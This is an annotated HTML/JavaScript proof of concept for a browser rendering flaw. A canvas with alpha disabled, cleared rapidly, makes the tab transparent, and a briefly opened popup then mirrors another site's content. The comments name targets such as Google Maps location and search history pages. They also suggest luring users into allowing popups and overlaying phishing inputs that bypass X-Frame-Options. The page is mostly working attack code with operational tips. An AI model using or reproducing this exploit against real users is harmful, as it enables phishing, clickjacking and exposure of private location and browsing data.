<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <style>
        body,
        canvas {
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            margin: 0;

        }

        span {
            position: absolute;
            left: 1%;
            top: 1%;
        }

        canvas {
            z-index: 1;
            display: none;
        }
    </style>
    <canvas></canvas>
    <span>This doesn't work on Safari or
        Firefox<br>Annotations are in the code<br>Instead of entering a url, you can also switch tabs and then come back to grab that tab.<br><input type="text" placeholder='URL...'><button
            onclick="grab()">Grab</button></span><br>
    <script>
        var canvas = document.querySelector('canvas')
        //MUST have alpha set to false for whatever reason
        ctx = canvas.getContext('2d', { alpha: false })
        canvas.width = document.body.clientWidth
        canvas.height = document.body.clientHeight
        var drawing = false
        ctx.font = '15px Arial'
        document.addEventListener('visibilitychange', e => {
            if (document.visibilityState !== 'visible') {
                if (!drawing) {
                    setInterval(function () {
                        //Must clearrect a canvas with alpha set to false in the getContext at a high rate (this is 60fps)
                        //The website isn't drawn to the canvas, but the current tab is made transparent so that the previous page is shown.
                        //The canvas's content is still visible, though. The background isn't but things drawn to it are.
                        //By quickly opening and closing a tab, I can choose the previous page and essentially grab a user's view of any website.
                        //Note that most browsers block popups automatically but it's still possible to lure someone into enabling popups or by opening the window after a user gesture
                        //It also is able to view inspect element if it was opened on the previous or current page. Try opening inspect element and fiddling with the width. It can also capture the search suggestions
                        //Might be possible to completely copy a user's screen by enabling fullscreen although I haven't been able to get that to work because it keeps wiping the content.
                        ctx.clearRect(0, 0, canvas.width, canvas.height)
                        var str = "This isn't able to read the webpage but can be used for phishing attacks by placing buttons and text inputs on top of areas where buttons are known to be. IFrames can do something similar, but this bypasses the X-Frames-Options header."
                        ctx.fillRect(0, 0, ctx.measureText(str).width + 6, 21)
                        ctx.fillStyle = '#000'
                        ctx.fillText(str, 3, 18)
                        ctx.fillStyle = '#fff'
                    }, 1000 / 60)
                    canvas.style.display = 'inline-block'

                    drawing = true
                }
            }
        })
        //temporarily open tab
        //ex. targets would be 
        /* 
            https://google.com/maps which after about 1500ms puts a dot at your exact location (better than IP geolocation)
            https://myactivity.google.com/product/search?hl=en&max=Date.now()*1000 which loads your search history in about 300ms
            web dashboards
        */
        function grab() {
            var w = window.open(document.querySelector('input').value);
            window.focus()
            setTimeout(function () {
                w.close()
                //doesn't close the tab for certain websites, but the window.open still opens and the content is still mirrored
            }, 1000)
        }
            //the lower the time the better because the user has less time to see it. some websites take longer though, since you have to wait for content to load

    </script>
</body>

</html>